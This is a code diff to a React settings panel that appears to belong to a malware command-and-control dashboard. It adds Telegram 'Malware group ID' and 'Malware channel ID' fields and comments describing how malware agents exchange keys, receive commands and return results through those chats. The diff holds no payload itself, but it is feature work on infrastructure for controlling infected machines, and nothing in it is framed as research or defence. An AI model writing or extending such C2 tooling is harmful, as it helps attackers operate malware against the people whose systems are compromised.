@@ -1,6 +1,6 @@
 'use client';
 
-import { useState, useRef } from 'react';
+import { useState, useRef, useEffect } from 'react';
 import { motion, AnimatePresence } from 'framer-motion';
 import {
   Send, Settings, MessageSquare, Loader2, Bot,
@@ -12,16 +12,21 @@ import { useToast } from '@/context/ToastContext';
 import { useTelegramConfig } from '@/hooks/useApi';
 import { api } from '@/lib/api';
 import { cn } from '@/lib/utils';
+import type { TelegramSettings } from '@/types';
 
 /* ─── Active Bot Card ─────────────────────────────────────────────────── */
 function ActiveBotCard({
   maskedToken,
   chatIds,
+  c2GroupId,
+  c2ChannelId,
   onDelete,
   deleting,
 }: {
   maskedToken: string;
   chatIds: string[];
+  c2GroupId?: string;
+  c2ChannelId?: string;
   onDelete: () => void;
   deleting: boolean;
 }) {
@@ -42,6 +47,10 @@ function ActiveBotCard({
           {chatIds.length > 0
             ? `${chatIds.length} chat ID${chatIds.length !== 1 ? 's' : ''}: ${chatIds.join(', ')}`
             : 'No chat IDs configured'}
+        </p>
+        <p className="text-[11px] text-c2-muted/80 mt-1.5 font-mono break-all leading-relaxed">
+          <span className="text-c2-muted">Malware group:</span> {c2GroupId ?? '—'}{' '}
+          <span className="text-c2-muted">· channel:</span> {c2ChannelId ?? '—'}
         </p>
       </div>
       <motion.button
@@ -70,6 +79,8 @@ export function TelegramSettings() {
   // Config form
   const [token, setToken] = useState('');
   const [chatIds, setChatIds] = useState('');
+  const [c2GroupId, setC2GroupId] = useState('');
+  const [c2ChannelId, setC2ChannelId] = useState('');
   const [savingConfig, setSavingConfig] = useState(false);
   const [deletingConfig, setDeletingConfig] = useState(false);
   const [showAddForm, setShowAddForm] = useState(false);
@@ -95,23 +106,33 @@ export function TelegramSettings() {
   const [testMessage, setTestMessage] = useState('');
   const [testSending, setTestSending] = useState(false);
 
+  useEffect(() => {
+    if (!showAddForm || !botConfig) return;
+    setC2GroupId(botConfig.c2_group_id ?? '');
+    setC2ChannelId(botConfig.c2_channel_id ?? '');
+  }, [showAddForm, botConfig]);
+
   /* handlers ── config ── */
   const handleSaveConfig = async () => {
-    if (!token.trim() && !chatIds.trim()) {
+    if (!token.trim() && !chatIds.trim() && !c2GroupId.trim() && !c2ChannelId.trim()) {
       toast.warning('Please fill in at least one field', 'Validation');
       return;
     }
     try {
       setSavingConfig(true);
-      const payload: { token?: string; chat_ids?: string[] } = {};
+      const payload: TelegramSettings = {};
       if (token.trim()) payload.token = token.trim();
       if (chatIds.trim()) {
         payload.chat_ids = chatIds.split(',').map(id => id.trim()).filter(Boolean);
       }
+      if (c2GroupId.trim()) payload.c2_group_id = c2GroupId.trim();
+      if (c2ChannelId.trim()) payload.c2_channel_id = c2ChannelId.trim();
       await api.updateTelegramSettings(payload);
       toast.success('Bot configuration saved successfully', 'Saved ✓');
       setToken('');
       setChatIds('');
+      setC2GroupId('');
+      setC2ChannelId('');
       setShowAddForm(false);
       await refreshConfig();
     } catch (err: unknown) {
@@ -301,6 +322,8 @@ export function TelegramSettings() {
           <ActiveBotCard
             maskedToken={botConfig.masked_token}
             chatIds={botConfig.chat_ids}
+            c2GroupId={botConfig.c2_group_id}
+            c2ChannelId={botConfig.c2_channel_id}
             onDelete={handleDeleteConfig}
             deleting={deletingConfig}
           />
@@ -349,6 +372,37 @@ export function TelegramSettings() {
                     className="c2-input font-mono text-sm placeholder:text-c2-muted/40"
                   />
                   <p className="text-xs text-c2-muted/60 mt-1.5">Comma-separated list of chat IDs</p>
+                </div>
+                {/* C2 malware protocol chats — must match bot.py + malware agents */}
+                <div>
+                  <label className="text-xs text-c2-muted mb-2 block font-medium uppercase tracking-wider flex items-center gap-1.5">
+                    <MessageSquare size={11} /> Malware group ID
+                  </label>
+                  <input
+                    type="text"
+                    value={c2GroupId}
+                    onChange={e => setC2GroupId(e.target.value)}
+                    placeholder="-100xxxxxxxxxx"
+                    className="c2-input font-mono text-sm placeholder:text-c2-muted/40"
+                  />
+                  <p className="text-xs text-c2-muted/60 mt-1.5">
+                    Where PUBLIC_KEY / HANDSHAKE_OK / CMD are posted (same supergroup for all agents)
+                  </p>
+                </div>
+                <div>
+                  <label className="text-xs text-c2-muted mb-2 block font-medium uppercase tracking-wider flex items-center gap-1.5">
+                    <Send size={11} /> Malware channel ID
+                  </label>
+                  <input
+                    type="text"
+                    value={c2ChannelId}
+                    onChange={e => setC2ChannelId(e.target.value)}
+                    placeholder="-100xxxxxxxxxx"
+                    className="c2-input font-mono text-sm placeholder:text-c2-muted/40"
+                  />
+                  <p className="text-xs text-c2-muted/60 mt-1.5">
+                    Channel where agents send KEY_REQUEST, HANDSHAKE, RESULT (bot must be admin)
+                  </p>
                 </div>
                 {/* Buttons */}
                 <div className="flex gap-2">
